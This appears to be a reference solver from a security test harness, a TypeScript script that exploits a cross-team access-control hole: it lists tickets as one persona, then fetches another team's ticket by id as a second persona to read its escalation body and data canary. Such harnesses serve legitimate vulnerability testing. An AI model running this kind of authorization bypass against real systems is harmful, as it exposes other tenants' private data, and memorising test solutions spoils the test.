// Cross-team read via the ticket detail endpoint: discover a team B ticket id as persona_b, then fetch
// it by id as persona_a and pull its escalation body (which carries team B's data canary).
import type { SolverCtx } from '../../truth/matrix-helpers.ts'

export async function solve(ctx: SolverCtx): Promise<void> {
  await ctx.login('persona_b')
  const listRes = await ctx.fetch(ctx.plan.routes.ticketList!.path, { method: 'GET' })
  const list = (await listRes.json()) as { items?: Array<{ ext_id: string }> }
  const victimId = list.items?.[0]?.ext_id
  if (!victimId) return

  await ctx.login('persona_a')
  const path = ctx.plan.routes.ticketGet!.path.replace(/:[A-Za-z0-9_]+/, victimId)
  await ctx.fetch(path, { method: 'GET' })
}
